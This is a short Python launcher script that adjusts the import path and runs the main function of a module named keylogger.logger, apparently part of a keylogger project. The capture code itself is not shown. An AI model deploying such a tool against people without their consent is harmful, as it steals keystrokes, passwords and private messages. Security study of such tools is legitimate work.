import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from keylogger.logger import main

if __name__ == "__main__":
    main()
